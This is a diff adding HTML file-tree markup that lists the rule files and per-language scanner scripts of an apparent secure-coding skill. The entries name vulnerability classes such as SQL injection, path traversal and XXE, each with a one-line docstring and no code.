+<li class="file-tree__file"><a class="file-tree__file-link" href="../../practices/architecture-centric-engineering/skills/abd-secure-code/rules/no-path-traversal-in-paths.md" target="_blank" rel="noopener noreferrer"><strong>no-path-traversal-in-paths.md</strong></a><span class="file-meta"> → scanner: no_path_traversal_in_paths_scanner.py</span></li>
+<li class="file-tree__file"><a class="file-tree__file-link" href="../../practices/architecture-centric-engineering/skills/abd-secure-code/rules/no-plaintext-password-storage.md" target="_blank" rel="noopener noreferrer"><strong>no-plaintext-password-storage.md</strong></a><span class="file-meta"> → scanner: no_plaintext_password_storage_scanner.py</span></li>
+<li class="file-tree__file"><a class="file-tree__file-link" href="../../practices/architecture-centric-engineering/skills/abd-secure-code/rules/no-plaintext-sensitive-data-at-rest.md" target="_blank" rel="noopener noreferrer"><strong>no-plaintext-sensitive-data-at-rest.md</strong></a><span class="file-meta"> → scanner: no_plaintext_sensitive_data_at_rest_scanner.py</span></li>
+<li class="file-tree__file"><a class="file-tree__file-link" href="../../practices/architecture-centric-engineering/skills/abd-secure-code/rules/no-predictable-session-token.md" target="_blank" rel="noopener noreferrer"><strong>no-predictable-session-token.md</strong></a><span class="file-meta"> → scanner: no_predictable_session_token_scanner.py</span></li>
+<li class="file-tree__file"><a class="file-tree__file-link" href="../../practices/architecture-centric-engineering/skills/abd-secure-code/rules/no-secrets-in-log-output.md" target="_blank" rel="noopener noreferrer"><strong>no-secrets-in-log-output.md</strong></a><span class="file-meta"> → scanner: no_secrets_in_log_output_scanner.py</span></li>
+<li class="file-tree__file"><a class="file-tree__file-link" href="../../practices/architecture-centric-engineering/skills/abd-secure-code/rules/no-sensitive-error-disclosure.md" target="_blank" rel="noopener noreferrer"><strong>no-sensitive-error-disclosure.md</strong></a><span class="file-meta"> → scanner: no_sensitive_error_disclosure_scanner.py</span></li>
+<li class="file-tree__file"><a class="file-tree__file-link" href="../../practices/architecture-centric-engineering/skills/abd-secure-code/rules/no-sql-string-concatenation.md" target="_blank" rel="noopener noreferrer"><strong>no-sql-string-concatenation.md</strong></a><span class="file-meta"> → scanner: no_sql_string_concatenation_scanner.py</span></li>
+<li class="file-tree__file"><a class="file-tree__file-link" href="../../practices/architecture-centric-engineering/skills/abd-secure-code/rules/no-toctou-outside-lock.md" target="_blank" rel="noopener noreferrer"><strong>no-toctou-outside-lock.md</strong></a><span class="file-meta"> → scanner: no_toctou_outside_lock_scanner.py</span></li>
+<li class="file-tree__file"><a class="file-tree__file-link" href="../../practices/architecture-centric-engineering/skills/abd-secure-code/rules/no-unsafe-deserialization.md" target="_blank" rel="noopener noreferrer"><strong>no-unsafe-deserialization.md</strong></a><span class="file-meta"> → scanner: no_unsafe_deserialization_scanner.py</span></li>
+<li class="file-tree__file"><a class="file-tree__file-link" href="../../practices/architecture-centric-engineering/skills/abd-secure-code/rules/no-unsafe-file-upload-handling.md" target="_blank" rel="noopener noreferrer"><strong>no-unsafe-file-upload-handling.md</strong></a><span class="file-meta"> → scanner: no_unsafe_file_upload_handling_scanner.py</span></li>
+<li class="file-tree__file"><a class="file-tree__file-link" href="../../practices/architecture-centric-engineering/skills/abd-secure-code/rules/no-untrusted-component-sources.md" target="_blank" rel="noopener noreferrer"><strong>no-untrusted-component-sources.md</strong></a><span class="file-meta"> → scanner: no_untrusted_component_sources_scanner.py</span></li>
+<li class="file-tree__file"><a class="file-tree__file-link" href="../../practices/architecture-centric-engineering/skills/abd-secure-code/rules/no-weak-crypto-algorithms.md" target="_blank" rel="noopener noreferrer"><strong>no-weak-crypto-algorithms.md</strong></a><span class="file-meta"> → scanner: no_weak_crypto_algorithms_scanner.py</span></li>
+<li class="file-tree__file"><a class="file-tree__file-link" href="../../practices/architecture-centric-engineering/skills/abd-secure-code/rules/no-xxe-unsafe-xml-parser.md" target="_blank" rel="noopener noreferrer"><strong>no-xxe-unsafe-xml-parser.md</strong></a><span class="file-meta"> → scanner: no_xxe_unsafe_xml_parser_scanner.py</span></li>
+</ul></div></details></li>
+<li class="file-list__folder"><details class="file-tree__details"><summary class="file-tree__summary"><strong>scanners/</strong><span class="file-meta"> → Folder (5 items).</span></summary><div class="file-tree__inner"><ul class="file-list file-list--nested file-tree__ul">
+<li class="file-tree__dir"><details class="file-tree__details"><summary class="file-tree__summary"><strong>common/</strong><span class="file-meta"> → Folder (4 items).</span></summary><div class="file-tree__inner"><ul class="file-list file-list--nested file-tree__ul">
+<li class="file-tree__file"><a class="file-tree__file-link" href="../../practices/architecture-centric-engineering/skills/abd-secure-code/scanners/common/catalog_scanner.py" target="_blank" rel="noopener noreferrer"><strong>catalog_scanner.py</strong></a><span class="file-meta"> → &quot;&quot;&quot;Run pattern-catalog scans for a rule + language.&quot;&quot;&quot;</span></li>
+<li class="file-tree__file"><a class="file-tree__file-link" href="../../practices/architecture-centric-engineering/skills/abd-secure-code/scanners/common/generate_scanners.py" target="_blank" rel="noopener noreferrer"><strong>generate_scanners.py</strong></a><span class="file-meta"> → &quot;&quot;&quot;Generate language scanner entrypoints from the pattern catalog.&quot;&quot;&quot;</span></li>
+<li class="file-tree__file"><a class="file-tree__file-link" href="../../practices/architecture-centric-engineering/skills/abd-secure-code/scanners/common/pattern_catalog.py" target="_blank" rel="noopener noreferrer"><strong>pattern_catalog.py</strong></a><span class="file-meta"> → &quot;&quot;&quot;Central pattern catalog for abd-secure-code scanners (enterprise coverage).</span></li>
+<li class="file-tree__file"><a class="file-tree__file-link" href="../../practices/architecture-centric-engineering/skills/abd-secure-code/scanners/common/scan_utils.py" target="_blank" rel="noopener noreferrer"><strong>scan_utils.py</strong></a><span class="file-meta"> → &quot;&quot;&quot;Shared utilities for abd-secure-code language scanners.&quot;&quot;&quot;</span></li>
+</ul></div></details></li>
+<li class="file-tree__dir"><details class="file-tree__details"><summary class="file-tree__summary"><strong>java/</strong><span class="file-meta"> → Folder (25 items).</span></summary><div class="file-tree__inner"><ul class="file-list file-list--nested file-tree__ul">
+<li class="file-tree__file"><a class="file-tree__file-link" href="../../practices/architecture-centric-engineering/skills/abd-secure-code/scanners/java/java_code_scanner.py" target="_blank" rel="noopener noreferrer"><strong>java_code_scanner.py</strong></a><span class="file-meta"> → &quot;&quot;&quot;Base scanner for secure Java production code checks.&quot;&quot;&quot;</span></li>
+<li class="file-tree__file"><a class="file-tree__file-link" href="../../practices/architecture-centric-engineering/skills/abd-secure-code/scanners/java/no_client_side_auth_trust_scanner.py" target="_blank" rel="noopener noreferrer"><strong>no_client_side_auth_trust_scanner.py</strong></a><span class="file-meta"> → &quot;&quot;&quot;Scanner: No Client Side Auth Trust (java).&quot;&quot;&quot;</span></li>
+<li class="file-tree__file"><a class="file-tree__file-link" href="../../practices/architecture-centric-engineering/skills/abd-secure-code/scanners/java/no_dangerous_xss_sinks_scanner.py" target="_blank" rel="noopener noreferrer"><strong>no_dangerous_xss_sinks_scanner.py</strong></a><span class="file-meta"> → &quot;&quot;&quot;Scanner: No Dangerous Xss Sinks (java).&quot;&quot;&quot;</span></li>
+<li class="file-tree__file"><a class="file-tree__file-link" href="../../practices/architecture-centric-engineering/skills/abd-secure-code/scanners/java/no_eval_dynamic_code_execution_scanner.py" target="_blank" rel="noopener noreferrer"><strong>no_eval_dynamic_code_execution_scanner.py</strong></a><span class="file-meta"> → &quot;&quot;&quot;Scanner: No Eval Dynamic Code Execution (java).&quot;&quot;&quot;</span></li>
+<li class="file-tree__file"><a class="file-tree__file-link" href="../../practices/architecture-centric-engineering/skills/abd-secure-code/scanners/java/no_excessive_response_data_scanner.py" target="_blank" rel="noopener noreferrer"><strong>no_excessive_response_data_scanner.py</strong></a><span class="file-meta"> → &quot;&quot;&quot;Scanner: No Excessive Response Data (java).&quot;&quot;&quot;</span></li>
+<li class="file-tree__file"><a class="file-tree__file-link" href="../../practices/architecture-centric-engineering/skills/abd-secure-code/scanners/java/no_hardcoded_secrets_scanner.py" target="_blank" rel="noopener noreferrer"><strong>no_hardcoded_secrets_scanner.py</strong></a><span class="file-meta"> → &quot;&quot;&quot;Scanner: No Hardcoded Secrets (java).&quot;&quot;&quot;</span></li>
+<li class="file-tree__file"><a class="file-tree__file-link" href="../../practices/architecture-centric-engineering/skills/abd-secure-code/scanners/java/no_insufficient_login_rate_limiting_scanner.py" target="_blank" rel="noopener noreferrer"><strong>no_insufficient_login_rate_limiting_scanner.py</strong></a><span class="file-meta"> → &quot;&quot;&quot;Scanner: No Insufficient Login Rate Limiting (java).&quot;&quot;&quot;</span></li>
+<li class="file-tree__file"><a class="file-tree__file-link" href="../../practices/architecture-centric-engineering/skills/abd-secure-code/scanners/java/no_jwt_none_algorithm_scanner.py" target="_blank" rel="noopener noreferrer"><strong>no_jwt_none_algorithm_scanner.py</strong></a><span class="file-meta"> → &quot;&quot;&quot;Scanner: No Jwt None Algorithm (java).&quot;&quot;&quot;</span></li>
+<li class="file-tree__file"><a class="file-tree__file-link" href="../../practices/architecture-centric-engineering/skills/abd-secure-code/scanners/java/no_ldap_filter_injection_scanner.py" target="_blank" rel="noopener noreferrer"><strong>no_ldap_filter_injection_scanner.py</strong></a><span class="file-meta"> → &quot;&quot;&quot;Scanner: No Ldap Filter Injection (java).&quot;&quot;&quot;</span></li>
+<li class="file-tree__file"><a class="file-tree__file-link" href="../../practices/architecture-centric-engineering/skills/abd-secure-code/scanners/java/no_mass_assignment_from_request_scanner.py" target="_blank" rel="noopener noreferrer"><strong>no_mass_assignment_from_request_scanner.py</strong></a><span class="file-meta"> → &quot;&quot;&quot;Scanner: No Mass Assignment From Request (java).&quot;&quot;&quot;</span></li>
+<li class="file-tree__file"><a class="file-tree__file-link" href="../../practices/architecture-centric-engineering/skills/abd-secure-code/scanners/java/no_missing_security_event_logging_scanner.py" target="_blank" rel="noopener noreferrer"><strong>no_missing_security_event_logging_scanner.py</strong></a><span class="file-meta"> → &quot;&quot;&quot;Scanner: No Missing Security Event Logging (java).&quot;&quot;&quot;</span></li>
+<li class="file-tree__file"><a class="file-tree__file-link" href="../../practices/architecture-centric-engineering/skills/abd-secure-code/scanners/java/no_os_command_injection_scanner.py" target="_blank" rel="noopener noreferrer"><strong>no_os_command_injection_scanner.py</strong></a><span class="file-meta"> → &quot;&quot;&quot;Scanner: No Os Command Injection (java).&quot;&quot;&quot;</span></li>
+<li class="file-tree__file"><a class="file-tree__file-link" href="../../practices/architecture-centric-engineering/skills/abd-secure-code/scanners/java/no_path_traversal_in_paths_scanner.py" target="_blank" rel="noopener noreferrer"><strong>no_path_traversal_in_paths_scanner.py</strong></a><span class="file-meta"> → &quot;&quot;&quot;Scanner: No Path Traversal In Paths (java).&quot;&quot;&quot;</span></li>
+<li class="file-tree__file"><a class="file-tree__file-link" href="../../practices/architecture-centric-engineering/skills/abd-secure-code/scanners/java/no_plaintext_password_storage_scanner.py" target="_blank" rel="noopener noreferrer"><strong>no_plaintext_password_storage_scanner.py</strong></a><span class="file-meta"> → &quot;&quot;&quot;Scanner: No Plaintext Password Storage (java).&quot;&quot;&quot;</span></li>
+<li class="file-tree__file"><a class="file-tree__file-link" href="../../practices/architecture-centric-engineering/skills/abd-secure-code/scanners/java/no_plaintext_sensitive_data_at_rest_scanner.py" target="_blank" rel="noopener noreferrer"><strong>no_plaintext_sensitive_data_at_rest_scanner.py</strong></a><span class="file-meta"> → &quot;&quot;&quot;Scanner: No Plaintext Sensitive Data At Rest (java).&quot;&quot;&quot;</span></li>
+<li class="file-tree__file"><a class="file-tree__file-link" href="../../practices/architecture-centric-engineering/skills/abd-secure-code/scanners/java/no_predictable_session_token_scanner.py" target="_blank" rel="noopener noreferrer"><strong>no_predictable_session_token_scanner.py</strong></a><span class="file-meta"> → &quot;&quot;&quot;Scanner: No Predictable Session Token (java).&quot;&quot;&quot;</span></li>
+<li class="file-tree__file"><a class="file-tree__file-link" href="../../practices/architecture-centric-engineering/skills/abd-secure-code/scanners/java/no_secrets_in_log_output_scanner.py" target="_blank" rel="noopener noreferrer"><strong>no_secrets_in_log_output_scanner.py</strong></a><span class="file-meta"> → &quot;&quot;&quot;Scanner: No Secrets In Log Output (java).&quot;&quot;&quot;</span></li>
+<li class="file-tree__file"><a class="file-tree__file-link" href="../../practices/architecture-centric-engineering/skills/abd-secure-code/scanners/java/no_sensitive_error_disclosure_scanner.py" target="_blank" rel="noopener noreferrer"><strong>no_sensitive_error_disclosure_scanner.py</strong></a><span class="file-meta"> → &quot;&quot;&quot;Scanner: No Sensitive Error Disclosure (java).&quot;&quot;&quot;</span></li>
+<li class="file-tree__file"><a class="file-tree__file-link" href="../../practices/architecture-centric-engineering/skills/abd-secure-code/scanners/java/no_sql_string_concatenation_scanner.py" target="_blank" rel="noopener noreferrer"><strong>no_sql_string_concatenation_scanner.py</strong></a><span class="file-meta"> → &quot;&quot;&quot;Scanner: No Sql String Concatenation (java).&quot;&quot;&quot;</span></li>
+<li class="file-tree__file"><a class="file-tree__file-link" href="../../practices/architecture-centric-engineering/skills/abd-secure-code/scanners/java/no_toctou_outside_lock_scanner.py" target="_blank" rel="noopener noreferrer"><strong>no_toctou_outside_lock_scanner.py</strong></a><span class="file-meta"> → &quot;&quot;&quot;Scanner: No Toctou Outside Lock (java).&quot;&quot;&quot;</span></li>
+<li class="file-tree__file"><a class="file-tree__file-link" href="../../practices/architecture-centric-engineering/skills/abd-secure-code/scanners/java/no_unsafe_deserialization_scanner.py" target="_blank" rel="noopener noreferrer"><strong>no_unsafe_deserialization_scanner.py</strong></a><span class="file-meta"> → &quot;&quot;&quot;Scanner: No Unsafe Deserialization (java).&quot;&quot;&quot;</span></li>
+<li class="file-tree__file"><a class="file-tree__file-link" href="../../practices/architecture-centric-engineering/skills/abd-secure-code/scanners/java/no_unsafe_file_upload_handling_scanner.py" target="_blank" rel="noopener noreferrer"><strong>no_unsafe_file_upload_handling_scanner.py</strong></a><span class="file-meta"> → &quot;&quot;&quot;Scanner: No Unsafe File Upload Handling (java).&quot;&quot;&quot;</span></li>
+<li class="file-tree__file"><a class="file-tree__file-link" href="../../practices/architecture-centric-engineering/skills/abd-secure-code/scanners/java/no_untrusted_component_sources_scanner.py" target="_blank" rel="noopener noreferrer"><strong>no_untrusted_component_sources_scanner.py</strong></a><span class="file-meta"> → &quot;&quot;&quot;Scanner: No Untrusted Component Sources (java).&quot;&quot;&quot;</span></li>
+<li class="file-tree__file"><a class="file-tree__file-link" href="../../practices/architecture-centric-engineering/skills/abd-secure-code/scanners/java/no_weak_crypto_algorithms_scanner.py" target="_blank" rel="noopener noreferrer"><strong>no_weak_crypto_algorithms_scanner.py</strong></a><span class="file-meta"> → &quot;&quot;&quot;Scanner: No Weak Crypto Algorithms (java).&quot;&quot;&quot;</span></li>
+<li class="file-tree__file"><a class="file-tree__file-link" href="../../practices/architecture-centric-engineering/skills/abd-secure-code/scanners/java/no_xxe_unsafe_xml_parser_scanner.py" target="_blank" rel="noopener noreferrer"><strong>no_xxe_unsafe_xml_parser_scanner.py</strong></a><span class="file-meta"> → &quot;&quot;&quot;Scanner: No Xxe Unsafe Xml Parser (java).&quot;&quot;&quot;</span></li>
+</ul></div></details></li>
+<li class="file-tree__dir"><details class="file-tree__details"><summary class="file-tree__summary"><strong>javascript/</strong><span class="file-meta"> → Folder (25 items).</span></summary><div class="file-tree__inner"><ul class="file-list file-list--nested file-tree__ul">
+<li class="file-tree__file"><a class="file-tree__file-link" href="../../practices/architecture-centric-engineering/skills/abd-secure-code/scanners/javascript/js_code_scanner.py" target="_blank" rel="noopener noreferrer"><strong>js_code_scanner.py</strong></a><span class="file-meta"> → &quot;&quot;&quot;Base scanner for secure JavaScript/TypeScript production code checks.&quot;&quot;&quot;</span></li>
+<li class="file-tree__file"><a class="file-tree__file-link" href="../../practices/architecture-centric-engineering/skills/abd-secure-code/scanners/javascript/no_client_side_auth_trust_scanner.py" target="_blank" rel="noopener noreferrer"><strong>no_client_side_auth_trust_scanner.py</strong></a><span class="file-meta"> → &quot;&quot;&quot;Scanner: No Client Side Auth Trust (javascript).&quot;&quot;&quot;</span></li>
+<li class="file-tree__file"><a class="file-tree__file-link" href="../../practices/architecture-centric-engineering/skills/abd-secure-code/scanners/javascript/no_dangerous_xss_sinks_scanner.py" target="_blank" rel="noopener noreferrer"><strong>no_dangerous_xss_sinks_scanner.py</strong></a><span class="file-meta"> → &quot;&quot;&quot;Scanner: No Dangerous Xss Sinks (javascript).&quot;&quot;&quot;</span></li>
+<li class="file-tree__file"><a class="file-tree__file-link" href="../../practices/architecture-centric-engineering/skills/abd-secure-code/scanners/javascript/no_eval_dynamic_code_execution_scanner.py" target="_blank" rel="noopener noreferrer"><strong>no_eval_dynamic_code_execution_scanner.py</strong></a><span class="file-meta"> → &quot;&quot;&quot;Scanner: No Eval Dynamic Code Execution (javascript).&quot;&quot;&quot;</span></li>
+<li class="file-tree__file"><a class="file-tree__file-link" href="../../practices/architecture-centric-engineering/skills/abd-secure-code/scanners/javascript/no_excessive_response_data_scanner.py" target="_blank" rel="noopener noreferrer"><strong>no_excessive_response_data_scanner.py</strong></a><span class="file-meta"> → &quot;&quot;&quot;Scanner: No Excessive Response Data (javascript).&quot;&quot;&quot;</span></li>
+<li class="file-tree__file"><a class="file-tree__file-link" href="../../practices/architecture-centric-engineering/skills/abd-secure-code/scanners/javascript/no_hardcoded_secrets_scanner.py" target="_blank" rel="noopener noreferrer"><strong>no_hardcoded_secrets_scanner.py</strong></a><span class="file-meta"> → &quot;&quot;&quot;Scanner: No Hardcoded Secrets (javascript).&quot;&quot;&quot;</span></li>
+<li class="file-tree__file"><a class="file-tree__file-link" href="../../practices/architecture-centric-engineering/skills/abd-secure-code/scanners/javascript/no_insufficient_login_rate_limiting_scanner.py" target="_blank" rel="noopener noreferrer"><strong>no_insufficient_login_rate_limiting_scanner.py</strong></a><span class="file-meta"> → &quot;&quot;&quot;Scanner: No Insufficient Login Rate Limiting (javascript).&quot;&quot;&quot;</span></li>
+<li class="file-tree__file"><a class="file-tree__file-link" href="../../practices/architecture-centric-engineering/skills/abd-secure-code/scanners/javascript/no_jwt_none_algorithm_scanner.py" target="_blank" rel="noopener noreferrer"><strong>no_jwt_none_algorithm_scanner.py</strong></a><span class="file-meta"> → &quot;&quot;&quot;Scanner: No Jwt None Algorithm (javascript).&quot;&quot;&quot;</span></li>
+<li class="file-tree__file"><a class="file-tree__file-link" href="../../practices/architecture-centric-engineering/skills/abd-secure-code/scanners/javascript/no_ldap_filter_injection_scanner.py" target="_blank" rel="noopener noreferrer"><strong>no_ldap_filter_injection_scanner.py</strong></a><span class="file-meta"> → &quot;&quot;&quot;Scanner: No Ldap Filter Injection (javascript).&quot;&quot;&quot;</span></li>
+<li class="file-tree__file"><a class="file-tree__file-link" href="../../practices/architecture-centric-engineering/skills/abd-secure-code/scanners/javascript/no_mass_assignment_from_request_scanner.py" target="_blank" rel="noopener noreferrer"><strong>no_mass_assignment_from_request_scanner.py</strong></a><span class="file-meta"> → &quot;&quot;&quot;Scanner: No Mass Assignment From Request (javascript).&quot;&quot;&quot;</span></li>
+<li class="file-tree__file"><a class="file-tree__file-link" href="../../practices/architecture-centric-engineering/skills/abd-secure-code/scanners/javascript/no_missing_security_event_logging_scanner.py" target="_blank" rel="noopener noreferrer"><strong>no_missing_security_event_logging_scanner.py</strong></a><span class="file-meta"> → &quot;&quot;&quot;Scanner: No Missing Security Event Logging (javascript).&quot;&quot;&quot;</span></li>
+<li class="file-tree__file"><a class="file-tree__file-link" href="../../practices/architecture-centric-engineering/skills/abd-secure-code/scanners/javascript/no_os_command_injection_scanner.py" target="_blank" rel="noopener noreferrer"><strong>no_os_command_injection_scanner.py</strong></a><span class="file-meta"> → &quot;&quot;&quot;Scanner: No Os Command Injection (javascript).&quot;&quot;&quot;</span></li>
+<li class="file-tree__file"><a class="file-tree__file-link" href="../../practices/architecture-centric-engineering/skills/abd-secure-code/scanners/javascript/no_path_traversal_in_paths_scanner.py" target="_blank" rel="noopener noreferrer"><strong>no_path_traversal_in_paths_scanner.py</strong></a><span class="file-meta"> → &quot;&quot;&quot;Scanner: No Path Traversal In Paths (javascript).&quot;&quot;&quot;</span></li>
+<li class="file-tree__file"><a class="file-tree__file-link" href="../../practices/architecture-centric-engineering/skills/abd-secure-code/scanners/javascript/no_plaintext_password_storage_scanner.py" target="_blank" rel="noopener noreferrer"><strong>no_plaintext_password_storage_scanner.py</strong></a><span class="file-meta"> → &quot;&quot;&quot;Scanner: No Plaintext Password Storage (javascript).&quot;&quot;&quot;</span></li>
+<li class="file-tree__file"><a class="file-tree__file-link" href="../../practices/architecture-centric-engineering/skills/abd-secure-code/scanners/javascript/no_plaintext_sensitive_data_at_rest_scanner.py" target="_blank" rel="noopener noreferrer"><strong>no_plaintext_sensitive_data_at_rest_scanner.py</strong></a><span class="file-meta"> → &quot;&quot;&quot;Scanner: No Plaintext Sensitive Data At Rest (javascript).&quot;&quot;&quot;</span></li>
+<li class="file-tree__file"><a class="file-tree__file-link" href="../../practices/architecture-centric-engineering/skills/abd-secure-code/scanners/javascript/no_predictable_session_token_scanner.py" target="_blank" rel="noopener noreferrer"><strong>no_predictable_session_token_scanner.py</strong></a><span class="file-meta"> → &quot;&quot;&quot;Scanner: No Predictable Session Token (javascript).&quot;&quot;&quot;</span></li>
+<li class="file-tree__file"><a class="file-tree__file-link" href="../../practices/architecture-centric-engineering/skills/abd-secure-code/scanners/javascript/no_secrets_in_log_output_scanner.py" target="_blank" rel="noopener noreferrer"><strong>no_secrets_in_log_output_scanner.py</strong></a><span class="file-meta"> → &quot;&quot;&quot;Scanner: No Secrets In Log Output (javascript).&quot;&quot;&quot;</span></li>
+<li class="file-tree__file"><a class="file-tree__file-link" href="../../practices/architecture-centric-engineering/skills/abd-secure-code/scanners/javascript/no_sensitive_error_disclosure_scanner.py" target="_blank" rel="noopener noreferrer"><strong>no_sensitive_error_disclosure_scanner.py</strong></a><span class="file-meta"> → &quot;&quot;&quot;Scanner: No Sensitive Error Disclosure (javascript).&quot;&quot;&quot;</span></li>
+<li class="file-tree__file"><a class="file-tree__file-link" href="../../practices/architecture-centric-engineering/skills/abd-secure-code/scanners/javascript/no_sql_string_concatenation_scanner.py" target="_blank" rel="noopener noreferrer"><strong>no_sql_string_concatenation_scanner.py</strong></a><span class="file-meta"> → &quot;&quot;&quot;Scanner: No Sql String Concatenation (javascript).&quot;&quot;&quot;</span></li>
+<li class="file-tree__file"><a class="file-tree__file-link" href="../../practices/architecture-centric-engineering/skills/abd-secure-code/scanners/javascript/no_toctou_outside_lock_scanner.py" target="_blank" rel="noopener noreferrer"><strong>no_toctou_outside_lock_scanner.py</strong></a><span class="file-meta"> → &quot;&quot;&quot;Scanner: No Toctou Outside Lock (javascript).&quot;&quot;&quot;</span></li>
+<li class="file-tree__file"><a class="file-tree__file-link" href="../../practices/architecture-centric-engineering/skills/abd-secure-code/scanners/javascript/no_unsafe_deserialization_scanner.py" target="_blank" rel="noopener noreferrer"><strong>no_unsafe_deserialization_scanner.py</strong></a><span class="file-meta"> → &quot;&quot;&quot;Scanner: No Unsafe Deserialization (javascript).&quot;&quot;&quot;</span></li>
+<li class="file-tree__file"><a class="file-tree__file-link" href="../../practices/architecture-centric-engineering/skills/abd-secure-code/scanners/javascript/no_unsafe_file_upload_handling_scanner.py" target="_blank" rel="noopener noreferrer"><strong>no_unsafe_file_upload_handling_scanner.py</strong></a><span class="file-meta"> → &quot;&quot;&quot;Scanner: No Unsafe File Upload Handling (javascript).&quot;&quot;&quot;</span></li>
+<li class="file-tree__file"><a class="file-tree__file-link" href="../../practices/architecture-centric-engineering/skills/abd-secure-code/scanners/javascript/no_untrusted_component_sources_scanner.py" target="_blank" rel="noopener noreferrer"><strong>no_untrusted_component_sources_scanner.py</strong></a><span class="file-meta"> → &quot;&quot;&quot;Scanner: No Untrusted Component Sources (javascript).&quot;&quot;&quot;</span></li>
+<li class="file-tree__file"><a class="file-tree__file-link" href="../../practices/architecture-centric-engineering/skills/abd-secure-code/scanners/javascript/no_weak_crypto_algorithms_scanner.py" target="_blank" rel="noopener noreferrer"><strong>no_weak_crypto_algorithms_scanner.py</strong></a><span class="file-meta"> → &quot;&quot;&quot;Scanner: No Weak Crypto Algorithms (javascript).&quot;&quot;&quot;</span></li>
+<li class="file-tree__file"><a class="file-tree__file-link" href="../../practices/architecture-centric-engineering/skills/abd-secure-code/scanners/javascript/no_xxe_unsafe_xml_parser_scanner.py" target="_blank" rel="noopener noreferrer"><strong>no_xxe_unsafe_xml_parser_scanner.py</strong></a><span class="file-meta"> → &quot;&quot;&quot;Scanner: No Xxe Unsafe Xml Parser (javascript).&quot;&quot;&quot;</span></li>
+</ul></div></details></li>
+<li class="file-tree__dir"><details class="file-tree__details"><summary class="file-tree__summary"><strong>python/</strong><span class="file-meta"> → Folder (25 items).</span></summary><div class="file-tree__inner"><ul class="file-list file-list--nested file-tree__ul">
+<li class="file-tree__file"><a class="file-tree__file-link" href="../../practices/architecture-centric-engineering/skills/abd-secure-code/scanners/python/code_scanner.py" target="_blank" rel="noopener noreferrer"><strong>code_scanner.py</strong></a><span class="file-meta"> → &quot;&quot;&quot;Base scanner for secure production Python code checks.&quot;&quot;&quot;</span></li>
+<li class="file-tree__file"><a class="file-tree__file-link" href="../../practices/architecture-centric-engineering/skills/abd-secure-code/scanners/python/no_client_side_auth_trust_scanner.py" target="_blank" rel="noopener noreferrer"><strong>no_client_side_auth_trust_scanner.py</strong></a><span class="file-meta"> → &quot;&quot;&quot;Scanner: No Client Side Auth Trust (python).&quot;&quot;&quot;</span></li>
+<li class="file-tree__file"><a class="file-tree__file-link" href="../../practices/architecture-centric-engineering/skills/abd-secure-code/scanners/python/no_dangerous_xss_sinks_scanner.py" target="_blank" rel="noopener noreferrer"><strong>no_dangerous_xss_sinks_scanner.py</strong></a><span class="file-meta"> → &quot;&quot;&quot;Scanner: No Dangerous Xss Sinks (python).&quot;&quot;&quot;</span></li>
+<li class="file-tree__file"><a class="file-tree__file-link" href="../../practices/architecture-centric-engineering/skills/abd-secure-code/scanners/python/no_eval_dynamic_code_execution_scanner.py" target="_blank" rel="noopener noreferrer"><strong>no_eval_dynamic_code_execution_scanner.py</strong></a><span class="file-meta"> → &quot;&quot;&quot;Scanner: No Eval Dynamic Code Execution (python).&quot;&quot;&quot;</span></li>
+<li class="file-tree__file"><a class="file-tree__file-link" href="../../practices/architecture-centric-engineering/skills/abd-secure-code/scanners/python/no_excessive_response_data_scanner.py" target="_blank" rel="noopener noreferrer"><strong>no_excessive_response_data_scanner.py</strong></a><span class="file-meta"> → &quot;&quot;&quot;Scanner: No Excessive Response Data (python).&quot;&quot;&quot;</span></li>
+<li class="file-tree__file"><a class="file-tree__file-link" href="../../practices/architecture-centric-engineering/skills/abd-secure-code/scanners/python/no_hardcoded_secrets_scanner.py" target="_blank" rel="noopener noreferrer"><strong>no_hardcoded_secrets_scanner.py</strong></a><span class="file-meta"> → &quot;&quot;&quot;Scanner: No Hardcoded Secrets (python).&quot;&quot;&quot;</span></li>
+<li class="file-tree__file"><a class="file-tree__file-link" href="../../practices/architecture-centric-engineering/skills/abd-secure-code/scanners/python/no_insufficient_login_rate_limiting_scanner.py" target="_blank" rel="noopener noreferrer"><strong>no_insufficient_login_rate_limiting_scanner.py</strong></a><span class="file-meta"> → &quot;&quot;&quot;Scanner: No Insufficient Login Rate Limiting (python).&quot;&quot;&quot;</span></li>
+<li class="file-tree__file"><a class="file-tree__file-link" href="../../practices/architecture-centric-engineering/skills/abd-secure-code/scanners/python/no_jwt_none_algorithm_scanner.py" target="_blank" rel="noopener noreferrer"><strong>no_jwt_none_algorithm_scanner.py</strong></a><span class="file-meta"> → &quot;&quot;&quot;Scanner: No Jwt None Algorithm (python).&quot;&quot;&quot;</span></li>
+<li class="file-tree__file"><a class="file-tree__file-link" href="../../practices/architecture-centric-engineering/skills/abd-secure-code/scanners/python/no_ldap_filter_injection_scanner.py" target="_blank" rel="noopener noreferrer"><strong>no_ldap_filter_injection_scanner.py</strong></a><span class="file-meta"> → &quot;&quot;&quot;Scanner: No Ldap Filter Injection (python).&quot;&quot;&quot;</span></li>
+<li class="file-tree__file"><a class="file-tree__file-link" href="../../practices/architecture-centric-engineering/skills/abd-secure-code/scanners/python/no_mass_assignment_from_request_scanner.py" target="_blank" rel="noopener noreferrer"><strong>no_mass_assignment_from_request_scanner.py</strong></a><span class="file-meta"> → &quot;&quot;&quot;Scanner: No Mass Assignment From Request (python).&quot;&quot;&quot;</span></li>
+<li class="file-tree__file"><a class="file-tree__file-link" href="../../practices/architecture-centric-engineering/skills/abd-secure-code/scanners/python/no_missing_security_event_logging_scanner.py" target="_blank" rel="noopener noreferrer"><strong>no_missing_security_event_logging_scanner.py</strong></a><span class="file-meta"> → &quot;&quot;&quot;Scanner: No Missing Security Event Logging (python).&quot;&quot;&quot;</span></li>
+<li class="file-tree__file"><a class="file-tree__file-link" href="../../practices/architecture-centric-engineering/skills/abd-secure-code/scanners/python/no_os_command_injection_scanner.py" target="_blank" rel="noopener noreferrer"><strong>no_os_command_injection_scanner.py</strong></a><span class="file-meta"> → &quot;&quot;&quot;Scanner: No Os Command Injection (python).&quot;&quot;&quot;</span></li>
+<li class="file-tree__file"><a class="file-tree__file-link" href="../../practices/architecture-centric-engineering/skills/abd-secure-code/scanners/python/no_path_traversal_in_paths_scanner.py" target="_blank" rel="noopener noreferrer"><strong>no_path_traversal_in_paths_scanner.py</strong></a><span class="file-meta"> → &quot;&quot;&quot;Scanner: No Path Traversal In Paths (python).&quot;&quot;&quot;</span></li>
